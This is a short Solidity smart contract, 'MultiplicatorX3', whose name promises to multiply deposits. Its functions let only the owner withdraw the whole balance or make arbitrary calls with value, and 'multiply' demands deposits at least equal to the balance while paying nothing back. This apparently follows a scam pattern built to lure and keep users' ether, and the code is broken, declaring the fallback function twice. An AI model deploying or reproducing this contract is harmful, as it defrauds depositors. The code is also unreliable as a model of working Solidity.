pragma solidity ^0.4.18;

contract MultiplicatorX3 {
    address public owner = msg.sender;

    function() public payable {}

    function withdraw() public {
        require(msg.sender == owner);
        owner.transfer(this.balance);
    }

    function command(address _adr, bytes _data) public payable {
        require(msg.sender == owner);
        require(_adr.call.value(msg.value)(_data));
    }

    function multiply(address _adr) public payable {
        require(msg.value >= this.balance);
        require(_adr.call.value(msg.value)(bytes4(keccak256("receiveFunds()"))));
    }
    
    function() public payable {}
}